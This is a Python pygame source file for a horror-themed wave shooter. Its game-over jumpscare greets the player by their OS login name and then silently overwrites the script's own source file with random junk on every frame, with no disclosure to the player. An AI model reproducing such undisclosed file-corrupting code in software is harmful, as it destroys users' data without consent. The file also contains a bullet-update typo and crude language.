import pygame
import random
import math
import sys
import os
import numpy as np
import pypresence

client_id = "1345305543295762533"
RPC = pypresence.Presence(client_id=client_id)
RPC.connect()
pygame.mixer.init(frequency=22050, size=-16, channels=2, buffer=4096)
pygame.init()
def update_rpc_presence():
    try:
        RPC.update(
            details="Playing MurderBob - REMASTERED",
            state="Wave {}".format(wave),
            large_image="/Assets/health.png",
            large_text="MurderBob - REMASTERED",
            small_text="Wave {}".format(wave),
        )
    except Exception as e:
        print(f"Error updating RPC presence: {e}")
MAX_BULLETS = 100
WIDTH, HEIGHT = 800, 600
MOVE_SPEED = 2
BULLET_SPEED = 10
WHITE = (255, 255, 255)
WAVE_DELAY = 4000
INITIAL_WAVE_DELAY = 10000
START_DELAY = 10000
WHITE = pygame.Color('white')
BLACK = pygame.Color('black')
RED = pygame.Color('red')
player_money = 0
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("MurderBob - REMASTERED")

font = pygame.font.SysFont('Arial', 24)
player_hurt_img = pygame.image.load("Assets/playerHURT.png")
player_img = pygame.image.load("Assets/Freakybob.png")
enemy_img = pygame.image.load("Assets/ScarySquirtward.png")
merchant = pygame.image.load("Assets/merchant.png")
merchant = pygame.transform.scale(merchant, (52, 52))
player_img = pygame.transform.scale(player_img, (52, 52))
enemy_img = pygame.transform.scale(enemy_img, (32, 32))
jumpscare_img = pygame.image.load("Assets/game_overJUMPSCARE.png")
jumpscare_sound = pygame.mixer.Sound("Assets/jumpscare.mp3")

bullet_img = pygame.Surface((5, 5))
bullet_img.fill((255, 255, 0))

pygame.mixer.init()
pygame.mixer.music.load("Assets/awesome_ass_music_David_Fesliyan.wav")
pygame.mixer.music.set_volume(0.2)
pygame.mixer.music.play(-1)

player_hurt = pygame.mixer.Sound("Assets/scream_pain_AHHHHH.mp3")
gunshot = pygame.mixer.Sound("Assets/gunshot.wav")


class Player:
    def __init__(self):
        self.image = player_img
        self.width, self.height = self.image.get_size()
        self.x = WIDTH // 2
        self.y = HEIGHT // 2
        self.health = 100
        self.speed = MOVE_SPEED
        self.last_hurt_time = 0
        self.hurt_cooldown = 1000
        self.original_image = self.image

    def move(self, keys, health_rect):
        original_x, original_y = self.x, self.y
        
        if keys[pygame.K_w]: self.y -= self.speed
        if keys[pygame.K_s]: self.y += self.speed
        if keys[pygame.K_a]: self.x -= self.speed
        if keys[pygame.K_d]: self.x += self.speed

        player_rect = pygame.Rect(self.x, self.y, self.width, self.height)

        if player_rect.colliderect(health_rect):
            self.x, self.y = original_x, original_y

        self.x = max(0, min(WIDTH - self.width, self.x))
        self.y = max(0, min(HEIGHT - self.height, self.y))

    def draw(self, screen):
        screen.blit(self.image, (self.x, self.y))

    def get_rect(self):
        return pygame.Rect(self.x, self.y, self.width, self.height)

    def hurt(self):
        current_time = pygame.time.get_ticks()
        if current_time - self.last_hurt_time >= self.hurt_cooldown: 
            player_hurt.play()
            self.image = player_hurt_img
            self.image = pygame.transform.scale(self.image, (52, 52))
            self.last_hurt_time = current_time
            pygame.time.set_timer(pygame.USEREVENT, 1500)

    def reset_image(self):
        self.image = self.original_image


class Bullet:
    def __init__(self, x, y, target_x, target_y):
        self.image = bullet_img
        self.x, self.y = x, y
        angle = math.atan2(target_y - y, target_x - x)
        self.dx = math.cos(angle) * BULLET_SPEED
        self.dy = math.sin(angle) * BULLET_SPEED

    def update(self):
        self.x += self.dx
        self.y += self.dy
        return not self.off_screen()

    def draw(self, screen):
        screen.blit(self.image, (self.x, self.y))

    def off_screen(self):
        return self.x < 0 or self.x > WIDTH or self.y < 0 or self.y > HEIGHT

    def get_rect(self):
        return pygame.Rect(self.x, self.y, 5, 5)


class Enemy:
    def __init__(self, speed, health_rect):
        self.image = enemy_img
        self.width, self.height = self.image.get_size()
        self.speed = speed
        self.x, self.y = self.spawn_enemy(health_rect)

    def spawn_enemy(self, health_rect):

        while True:
            x = random.randint(0, WIDTH - self.width)
            y = random.randint(0, HEIGHT - self.height)
            enemy_rect = pygame.Rect(x, y, self.width, self.height)
            if not enemy_rect.colliderect(health_rect):
                return x, y

    def move_towards(self, player):
        angle = math.atan2(player.y - self.y, player.x - self.x)
        self.x += math.cos(angle) * self.speed
        self.y += math.sin(angle) * self.speed

    def draw(self, screen):
        screen.blit(self.image, (self.x, self.y))

    def get_rect(self):
        return pygame.Rect(self.x, self.y, self.width, self.height)


class Merchant:
    def __init__(self):
        self.image = merchant
        self.width, self.height = self.image.get_size()
        self.x, self.y = random.randint(0, WIDTH - self.width), random.randint(0, HEIGHT - self.height)
        self.rect = pygame.Rect(self.x, self.y, self.width, self.height)
        self.spawn_time = pygame.time.get_ticks()

    def draw(self, screen):
        screen.blit(self.image, (self.x, self.y))

    def update(self):
        if pygame.time.get_ticks() - self.spawn_time > 10000:
            self.x, self.y = random.randint(0, WIDTH - self.width), random.randint(0, HEIGHT - self.height)
            self.rect = pygame.Rect(self.x, self.y, self.width, self.height)
            self.spawn_time = pygame.time.get_ticks()



cooldown_time = 2000
last_shot_time = 0
shots_fired = 0
overheat_cooldown = False

merchant = Merchant()


player = Player()
bullets = []
enemies = []
running = True
clock = pygame.time.Clock()

wave = 1
enemies_remaining = 0
wave_active = False
wave_start_time = pygame.time.get_ticks()
current_wave_delay = INITIAL_WAVE_DELAY
game_start_time = pygame.time.get_ticks()


merchant_screen_active = False
merchant_screen_image = pygame.image.load('Assets/merchant_screen.png')
def show_warning_screen():
    screen.fill(BLACK)

    font = pygame.font.Font(None, 48)
    small_font = pygame.font.Font(None, 36)
    
    message1 = "WARNING: This game contains flashing lights"
    message2 = "and loud noises. Proceed with caution."
    message3 = "Press ENTER to continue or ESC to quit."
    

    text1 = font.render(message1, True, RED)
    text2 = font.render(message2, True, RED)
    text3 = small_font.render(message3, True, WHITE)


    screen.blit(text1, (WIDTH // 2 - text1.get_width() // 2, HEIGHT // 3 - text1.get_height() // 2))
    screen.blit(text2, (WIDTH // 2 - text2.get_width() // 2, HEIGHT // 3 + text1.get_height() // 2))
    screen.blit(text3, (WIDTH // 2 - text3.get_width() // 2, HEIGHT // 2 + text2.get_height() // 2))

    pygame.display.flip()

    waiting_for_input = True
    while waiting_for_input:
        for event in pygame.event.get():
            if event.type == pygame.QUIT or (event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE):
                pygame.quit()
                sys.exit()
            if event.type == pygame.KEYDOWN and event.key == pygame.K_RETURN:
                waiting_for_input = False
                break



def draw_merchant_screen():
    global merchant_screen_active, player_money
    screen.fill((0, 0, 0))
    merchant_screen_resized = pygame.transform.scale(merchant_screen_image, (WIDTH, HEIGHT))
    screen.blit(merchant_screen_resized, (0, 0))


    font = pygame.font.Font(None, 36)
    if player_money <= 0:
        text = font.render(f"you poor ass bitch, gtfo of my store", True, WHITE)
    else:    
         text = font.render(f"Welcome to my shop! Money: {player_money}", True, WHITE)
    screen.blit(text, (WIDTH // 2 - text.get_width() // 2, 50))


    keys = pygame.key.get_pressed()
    if keys[pygame.K_l]:
        merchant_screen_active = False

    pygame.display.flip()


def start_wave():
    global wave, enemies_remaining, wave_active, wave_start_time, game_start_time
    if pygame.time.get_ticks() - game_start_time < START_DELAY:
        return

    num_enemies = wave * 1.5
    num_enemies = int(num_enemies)
    enemy_speed = 1.5 + (wave * 0.2)
    enemies.clear()

    health_image = pygame.image.load('Assets/health.png')
    health_rect = pygame.Rect(0, screen.get_height() - health_image.get_height() + 5, health_image.get_width(), health_image.get_height())

    for _ in range(num_enemies):
        enemies.append(Enemy(enemy_speed, health_rect))

    enemies_remaining = num_enemies
    wave_active = True
    wave_start_time = pygame.time.get_ticks()

start_wave()
update_rpc_presence()


def generate_raw_sound(duration_ms, frequency=440, volume=0.1):
    
    duration = duration_ms / 1000.0
    sample_rate = 22050
    samples = int(sample_rate * duration)
    
    time = np.linspace(0, duration, samples, endpoint=False)
    signal = np.sin(2 * np.pi * frequency * time)

    noise = np.random.uniform(-0.5, 0.5, samples) * 0.2 
    signal = signal + noise

    signal = np.clip(signal, -1, 1)

    sound_array = np.array(signal * 32767, dtype=np.int16)
    sound_array = sound_array.tobytes()
    
    return pygame.mixer.Sound(buffer=sound_array)

def distort_image(image, distortion_level):
    new_image = image.copy()
    new_image = new_image.convert(32)
    
    if distortion_level > 0:
        pixels = pygame.surfarray.pixels2d(new_image)
        for x in range(pixels.shape[0]):
            for y in range(pixels.shape[1]):
                color = pixels[x][y]
                r, g, b = (color >> 16) & 0xFF, (color >> 8) & 0xFF, color & 0xFF
                
                if r > 100 or g > 100 or b > 100:
                    r = max(0, r - distortion_level // 2)
                    g = max(0, g - distortion_level // 2)
                    b = max(0, b - distortion_level // 2)
                if r < 30 and g < 30 and b < 30:
                    r = min(255, r + 200)
                    g = min(255, g + 200)
                    b = min(255, b + 200)
                
                pixels[x][y] = (r << 16) | (g << 8) | b

    return new_image

def random_text():
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=~<>?/'
    return ''.join(random.choice(characters) for _ in range(random.randint(5, 20)))

def endJumpscare():
    current_file = __file__
    
    pygame.mixer.music.stop()
    pygame.mixer.stop()

    screen.fill((0, 0, 0))
    pygame.display.flip()
    pygame.time.wait(1000)

    jumpscare_scaled = pygame.transform.scale(jumpscare_img, (screen.get_width(), screen.get_height()))
    screen.blit(jumpscare_scaled, (0, 0))
    pygame.display.flip()

    start_time = pygame.time.get_ticks()
    flash_duration = 5000
    flash_interval = 50  

    distortion_level = 0
    flicker_chance = 0.15
    flicker_duration = 30 

    user_name = os.getlogin()
    spooky_texts = [
        f"Hello {user_name}",
        "I know who you are",
        "I'm coming for you",
        "The game is broken...",
        "GET OUT",
        "STOP PLAYING",
        "This isn't a game anymore (it actually is LMFAO).",
        random_text(),
        random_text(),
        random_text()
    ]

    corrupting_sound = generate_raw_sound(300, frequency=random.randint(100, 1000))

    while pygame.time.get_ticks() - start_time < flash_duration:
        pygame.display.set_caption(random_text())

        if random.random() < flicker_chance:
            screen.fill((0, 0, 0))
            pygame.display.flip()
            pygame.time.wait(flicker_duration)
        else:
            distorted_image = distort_image(jumpscare_scaled, distortion_level)
            
            jitter_x = random.randint(-20, 20)
            jitter_y = random.randint(-20, 20)
            screen.blit(distorted_image, (jitter_x, jitter_y)) 


            for _ in range(6):
                text = random.choice(spooky_texts + [random_text()])
                font = pygame.font.Font(None, random.randint(30, 60))
                color = pygame.Color(random.choice(['red', 'green', 'blue', 'yellow', 'purple', 'white', 'pink', 'orange']))
                rendered_text = font.render(text, True, color)
                screen.blit(rendered_text, (random.randint(0, screen.get_width() - rendered_text.get_width()),
                                            random.randint(0, screen.get_height() - rendered_text.get_height())))

            if random.random() < 0.2:
                corrupting_sound.play()

        distortion_level = min(distortion_level + 2, 40) 

        pygame.display.flip()
        pygame.time.wait(flash_interval)
        if random.random() < 10.3:
            try:
                with open(current_file, 'r+') as f:
                    lines = f.readlines()
                    if lines:
                        num_corruptions = random.randint(1, len(lines) // 200) 
                        for _ in range(num_corruptions):
                            random_line_index = random.randint(0, len(lines) - 1)
                            random_char_index = random.randint(0, len(lines[random_line_index]) - 1) if len(lines[random_line_index]) > 0 else 0
                            random_string = random_text() * random.randint(1, 5) 
                            lines[random_line_index] = lines[random_line_index][:random_char_index] + random_string + lines[random_line_index][random_char_index:]

                        junk_size = random.randint(100, 500)
                        junk_data = ''.join(random.choice(''.join(chr(i) for i in range(32, 127))) for _ in range(junk_size))
                        lines.append(junk_data)

                        f.seek(0)
                        f.writelines(lines)
                        f.truncate()
            except FileNotFoundError:
                pass

    jumpscare_sound.play()
    
    pygame.time.wait(5000)
    pygame.quit()
    sys.exit()

    
gun_overheating = False
overheat_start_time = 0
shots_fired = 0
overheat_duration = 2000
MAX_SHOTS_BEFORE_OVERHEAT = 10
overheat_cooldown = False
game_started = False
while running:
    if not game_started:
        show_warning_screen()
        game_started = True 
        continue
    screen.fill((0, 0, 0))
    keys = pygame.key.get_pressed()

    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        elif event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
            running = False
        elif event.type == pygame.MOUSEBUTTONDOWN:
            mx, my = pygame.mouse.get_pos()


            if not overheat_cooldown and len(bullets) < MAX_BULLETS:

                bullets.append(Bullet(player.x + 26, player.y + 26, mx, my))
                gunshot.play()
                shots_fired += 1

                if shots_fired >= MAX_SHOTS_BEFORE_OVERHEAT:
                    overheat_cooldown = True
                    overheat_start_time = pygame.time.get_ticks()
                    shots_fired = 0

        elif event.type == pygame.USEREVENT:
            player.reset_image()


    if overheat_cooldown:
        if pygame.time.get_ticks() - overheat_start_time >= overheat_duration:
            overheat_cooldown = False
            shots_fired = 0 


    if player.health <= 0:
        endJumpscare()
        running = False

    if merchant_screen_active:
        pygame.mixer.music.pause()
        draw_merchant_screen()
        continue
    else:
        pygame.mixer.music.unpause()


        if wave_active and enemies_remaining == 0:
            wave_active = False
            current_wave_delay = WAVE_DELAY
            wave_start_time = pygame.time.get_ticks()
        elif not wave_active and pygame.time.get_ticks() - wave_start_time >= current_wave_delay:
            start_wave()
            wave += 1

        health_image = pygame.image.load('Assets/health.png')
        health_rect = pygame.Rect(0, screen.get_height() - health_image.get_height() + 5, health_image.get_width(), health_image.get_height())
        player.move(keys, health_rect)

        bbullets = [bullet for bullet in bullets if bullet.update()]

        for enemy in enemies[:]:
            enemy.move_towards(player)
            if enemy.get_rect().colliderect(player.get_rect()):
                player.health -= 7
                player.hurt()
                enemies.remove(enemy)
                enemies_remaining -= 1

        merchant.update()
        merchant.draw(screen)

        if player.get_rect().colliderect(merchant.rect) and not merchant_screen_active:
            font = pygame.font.Font(None, 24)
            text = font.render("Press E to interact", True, WHITE)
            screen.blit(text, (WIDTH // 2 - 100, HEIGHT // 2 - 50))

            if keys[pygame.K_e]:
                merchant_screen_active = True  

        for bullet in bullets[:]:
            for enemy in enemies[:]:
                if bullet.get_rect().colliderect(enemy.get_rect()):
                    bullets.remove(bullet)
                    enemies.remove(enemy)
                    enemies_remaining -= 1
                    break 

        if enemies_remaining == 0 and wave_active:
            wave_active = False
            current_wave_delay = WAVE_DELAY
            wave_start_time = pygame.time.get_ticks()

        if not wave_active and pygame.time.get_ticks() - wave_start_time > current_wave_delay:
            wave += 1
            start_wave()

        if not wave_active:
            if wave == 1 and 'start_time' not in locals():
                start_time = pygame.time.get_ticks()
                countdown = 10
            elif wave == 1:
                elapsed_time = (pygame.time.get_ticks() - start_time) // 1000
                countdown = max(0, 10 - elapsed_time)
            else:
                time_left = (pygame.time.get_ticks() - wave_start_time) // 1000
                time_left = max(0, WAVE_DELAY // 1000 - time_left)
                countdown = time_left
            font = pygame.font.Font(None, 24)
            wave_countdown_text = font.render(f"Wave {wave} starts in {countdown}", True, WHITE)
            screen.blit(wave_countdown_text, (WIDTH // 2 - 150, 10))

        if not merchant_screen_active:
            player.draw(screen)
            for bullet in bullets:
                bullet.draw(screen)
            for enemy in enemies:
                enemy.draw(screen)

            wave_text = font.render(f"Wave: {wave}", True, WHITE)
            screen.blit(wave_text, (WIDTH - 100, 10))
            health_text = font.render(f"Health: {player.health}", True, WHITE)
            health_image.blit(health_text, (28, 30))
            screen.blit(health_image, (0, screen.get_height() - health_image.get_height() + 5))
            
    
        
    pygame.display.flip()
    clock.tick(60)
    
RPC.close()
pygame.quit()
